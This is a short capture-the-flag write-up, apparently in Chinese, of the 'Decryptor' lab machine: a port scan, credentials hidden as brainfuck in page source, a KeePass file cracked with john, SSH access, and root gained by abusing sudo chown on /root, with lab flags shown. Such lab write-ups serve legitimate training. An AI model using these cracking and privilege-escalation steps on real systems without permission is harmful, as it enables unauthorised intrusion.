# Decryptor

2025.03.06 https://thehackerslabs.com/decryptor/

[video](https://www.bilibili.com/video/BV1dH9rY7EVN/?spm_id_from=333.1387.collection.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.39

## Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2121/tcp open  ccproxy-ftp
```

80 web 源码底部发现 brainfuck 编码:

```
++++++++++[>+++++++++++>++++++++++>+++++++++++>+++++++++++>+++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++++>+++++++++++>++++++++++>++++++++++++>++++++++++++>++++++++++>++++++++++<<<<<<<<<<<<<<<-]>-.>---.>++++.>-----.>+.>+.>---.>----.>-----.>--.>+.>----..>---.>-.>+.

marioeatslettuce
```

像是个密码

对 80 扫描什么都没发现，只有上面这个字符串在仔细看看，好像能分解成 `mario:eatslettuce` 或者 `mario:marioeatslettuce` 尝试登陆 ssh 和 ftp，发现`mario:marioeatslettuce`能登陆 ftp。

发现 keeppass 文件 user.kdbx，使用 john 找到其密码为 moonshine1 ，在线解密 https://app.keeweb.info/ 输入密码，得到加密内容: `chiquero:barcelona2012` 应该是 ssh 的凭据进行登陆。

先拿到 user flag：

```
chiquero@Decryptor:/home/mario$ cat user.txt
sfds5gf6sfdcdafsd5a7sdcydsf58
```

sudo -l 发现 chown 可以直接修改 /root 目录所有者：

```
chiquero@Decryptor:/var/www/html$ sudo chown chiquero:chiquero /root
chiquero@Decryptor:/var/www/html$ cd /root
chiquero@Decryptor:/root$ ls
root.txt
chiquero@Decryptor:/root$ cat root.txt
84c853bhfs5gsdfvsf4dasbsrha3a
```
